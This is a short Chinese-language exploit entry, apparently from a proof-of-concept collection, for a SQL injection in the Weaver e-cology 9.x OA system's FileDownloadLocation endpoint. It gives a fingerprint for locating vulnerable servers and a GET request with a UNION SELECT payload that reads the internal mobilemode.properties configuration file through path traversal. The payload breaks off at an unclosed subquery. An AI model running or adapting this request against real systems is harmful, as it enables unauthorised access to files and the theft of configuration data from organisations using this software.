# 泛微e-cology9x.FileDownloadLocation存在SQL注入漏洞

- **系统**：泛微OA　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`body="doCheckPopupBlocked"`
- **请求**：`GET /weaver/weaver.email.FileDownloadLocation/login/LoginSSOxjsp/x.FileDownloadLocation?ddcode=7ea7ef3c41d67297&downfiletype=eml&download=1&mailId=1123+union+select+*+from+(select+1+as+resourceid,%27../ecology/WEB-INF/prop/mobilemode.properties%27+as+x2,%273%27+as+x3,(select++*+from+(select+*+from+(`
- **预期**：200　|　—